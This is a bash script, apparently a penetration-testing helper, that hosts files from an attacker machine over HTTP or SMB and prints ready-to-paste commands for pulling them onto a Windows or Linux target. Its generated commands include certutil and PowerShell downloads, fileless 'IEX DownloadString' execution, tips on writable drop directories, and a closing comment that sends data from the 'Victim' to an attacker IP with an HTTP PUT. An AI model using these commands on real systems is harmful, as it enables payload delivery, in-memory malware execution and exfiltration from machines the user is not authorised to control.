#!/usr/bin/env bash

OUTPUT_FILE="/tmp/transfer_commands.txt"
> "$OUTPUT_FILE"

# =======================
# Colors
# =======================
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
BOLD="\e[1m"
RESET="\e[0m"


# =======================
# Config
# =======================
PORT=80
DIR="/home/kali/Desktop/transfer"
USER="user"
PASSWORD="pass"

# =======================
# Validate Arguments
# =======================
if [[ $# -lt 2 || $# -gt 3 ]]; then
  echo -e "${RED}Usage:${RESET} $0 <host>:<windows|linux> <http|smb|both> [http_port]"
  echo "Use common ports for HTTP. e.g 80, 445"
  exit 1
fi


#====
# Functions
#=====

# =======================
# Tips
# =======================

print_tips() {
  echo -e "\n${BOLD}${CYAN}======================="
  echo -e "        TIPS"
  echo -e "=======================${RESET}"

  printf "${YELLOW}[*] Writable Windows directories to try:${RESET}\n"
  echo -e "    - C:\\Users\\Public\\"
  echo -e "    - C:\\Windows\\Temp\\"
  echo -e "    - C:\\Temp\\"

  printf "${YELLOW}[*] Writable Linux directories to try:${RESET}\n"
  printf "    - /tmp\n"
  printf "    - /dev/shm\n"
  printf "    - /var/tmp\n"
  printf "    - \$HOME\n\n"

  printf "${YELLOW}[*] If RDP access is obtained:${RESET}\n"
  printf "    - Browse to http://${IP}:${PORT}/ in a web browser\n"
  printf "    - Drag & drop files if clipboard redirection works\n\n"

  printf "${YELLOW}[*] If disk write is blocked:${RESET}\n"
  printf "    - Use in-memory execution:\n"
  printf "      powershell -c \"IEX (iwr 'http://${IP}:${PORT}/file.ps1').Content\"\n\n"

  printf "${YELLOW}[*] If SMB is allowed:${RESET}\n"
  printf "    - net use \\\\${IP}\\share /user:${USER} ${PASSWORD}\n"
  printf "    - copy \\\\${IP}\\share\\file.exe .\n\n"

  printf "${GREEN}${RESET}\n"
}

TARGET_INPUT="$1"
HOST_MODE=$(echo "$2" | tr '[:upper:]' '[:lower:]')

# If custom port supplied but protocol is SMB → error
if [[ -n "$3" && "$HOST_MODE" == "smb" ]]; then
  echo -e "${RED}Custom ports are only supported for HTTP mode.${RESET}"
  exit 1
fi

# Optional custom HTTP port
if [[ -n "$3" ]]; then
  if [[ "$3" =~ ^[0-9]+$ ]] && (( $3 >= 1 && $3 <= 65535 )); then
    PORT="$3"
  else
    echo -e "${RED}Invalid port number. Port: 1 - 65535.${RESET}"
    exit 1
  fi
fi

# Extract host and OS
TARGET_HOST="${TARGET_INPUT%%:*}"
TARGET_OS="${TARGET_INPUT##*:}"
TARGET_OS=$(echo "$TARGET_OS" | tr '[:upper:]' '[:lower:]')

# Validate OS
if [[ "$TARGET_OS" != "windows" && "$TARGET_OS" != "linux" ]]; then
  echo -e "${RED}Invalid OS. Use windows or linux.${RESET}"
  exit 1
fi

# Validate Protocol
if [[ "$HOST_MODE" != "http" && "$HOST_MODE" != "smb" && "$HOST_MODE" != "both" ]]; then
  echo -e "${RED}Invalid protocol. Use http, smb, or both.${RESET}"
  exit 1
fi

# =======================
# Get tun0 IP
# =======================
IP=$(ip addr show tun0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1)

if [[ -z "$IP" ]]; then
  echo -e "${RED}Could not determine tun0 IP${RESET}"
  exit 1
fi

cd "$DIR" || exit 1

# =======================
# Header
# =======================
printf "\n${BOLD}${CYAN}%-40s | %-8s | %-80s${RESET}\n" "File" "OS" "Command"
printf "${CYAN}%s${RESET}\n" "--------------------------------------------------------------------------------------------------------------------------"

# =======================
# Generate Commands
# =======================
find . -type f | while read -r file; do
  REL_PATH="${file#./}"
  URL="http://${IP}:${PORT}/${REL_PATH}"

  # -------- HTTP --------
  if [[ "$HOST_MODE" == "http" || "$HOST_MODE" == "both" ]]; then

    #CertUtil
    if [[ "$TARGET_OS" == "windows" ]]; then
      printf "${YELLOW}%-40s | %-8s | ${RESET}certutil -urlcache -f %s %s\n" \
        "$REL_PATH" "Windows" "$URL" "$REL_PATH" | tee -a "$OUTPUT_FILE"

      #Invoke web request
      printf "${YELLOW}%-40s | %-8s | ${RESET}powershell -c \"iwr %s -OutFile %s\"\n" \
        "$REL_PATH" "Windows" "$URL" "$REL_PATH" | tee -a "$OUTPUT_FILE"
      
      #Invoke in memory
      printf "${YELLOW}%-40s | %-8s | ${RESET}powershell -c \"IEX (New-Object Net.WebClient).DownloadString('%s')\"\n" \
        "$REL_PATH" "Windows" "$URL" | tee -a "$OUTPUT_FILE"

    else
      printf "${GREEN}%-40s | %-8s | ${RESET}curl -o %s %s\n" \
        "$REL_PATH" "Linux" "$REL_PATH" "$URL" | tee -a "$OUTPUT_FILE"

      printf "${GREEN}%-40s | %-8s | ${RESET}wget %s\n" \
        "$REL_PATH" "Linux" "$URL" | tee -a "$OUTPUT_FILE"
    fi
  fi

  # -------- SMB --------
  if [[ "$HOST_MODE" == "smb" || "$HOST_MODE" == "both" ]]; then
    if [[ "$TARGET_OS" == "windows" ]]; then


printf "${YELLOW}%-40s | %-8s | ${RED}net use \\\\\\\\%s\\share /user:%s %s; copy \\\\\\\\%s\\share\\%s .${RESET}\n" \
  "$REL_PATH" "Windows" "$IP" "$USER" "$PASSWORD" "$IP" "$REL_PATH" | tee -a "$OUTPUT_FILE"
    fi

    if [[ "$TARGET_OS" == "linux" ]]; then
      CMD="smbclient //${IP}/share -U ${USER}%${PASSWORD} -c \"get ${REL_PATH}\""
      printf "${GREEN}%-40s | %-8s | ${RED}%s${RESET}\n" \
        "$REL_PATH" "Linux" "$CMD" | tee -a "$OUTPUT_FILE"
    fi
  fi

  printf "${CYAN}%s${RESET}\n" "--------------------------------------------------------------------------------------------------------------------------" | tee -a "$OUTPUT_FILE"

done


# =======================
# Copyq Helper
# =======================

if [[ "$HOST_MODE" == "smb" || "$HOST_MODE" == "both" ]]; then

    if [[ "$TARGET_OS" == "windows" ]]; then

        CMD="net use \\\\${IP}\\share /user:${USER} ${PASSWORD}"
        CMD2="net use \\\\${IP}\\\share /user:${USER} ${PASSWORD}"

        printf "\n${BOLD}${CYAN}[SMB Windows Commands] - command copied to clipboard${RESET}\n"
        printf "${RED}%s${RESET}\n" "$CMD" | tee -a "$OUTPUT_FILE"
        copyq add "$CMD2"


    elif [[ "$TARGET_OS" == "linux" ]]; then

        CMD="smbclient //${IP}/share -U ${USER}%${PASSWORD}"

        printf "\n${BOLD}${CYAN}[SMB Linux Command]${RESET}\n"
        printf "${RED}%s${RESET}\n" "$CMD" | tee -a "$OUTPUT_FILE"

        copyq add "$CMD"

        echo -e "${GREEN}[+] SMB Linux command copied to clipboard${RESET}"
    fi
fi

# =======================
# Start Services
# =======================
trap "kill 0" EXIT

perl -pi -e 's/\e\[[0-9;]*m//g' $OUTPUT_FILE
printf "${RED}Commands available in %s${RESET}\n" "$OUTPUT_FILE"

print_tips

if [[ "$HOST_MODE" == "http" ]]; then
  echo -e "\n${GREEN}[+] Starting HTTP server on port ${PORT}${RESET}" | tee -a "$OUTPUT_FILE"
  python3 -m http.server "$PORT" --bind 0.0.0.0 & 
fi

if [[ "$HOST_MODE" == "smb" ]]; then
  echo -e "${GREEN}[+] Starting SMB server${RESET}" | tee -a "$OUTPUT_FILE"
  impacket-smbserver share "$DIR" -smb2support -username "$USER" -password "$PASSWORD" -debug &
fi
wait



# =======================
# Upload from Victim to me
# =======================
#Invoke-WebRequest -Uri http://192.168.45.155:4444/ -Method PUT -InFile data.zip -ContentType "application/octet-stream"
# copy file.zip //$ip/tmp/file.zip
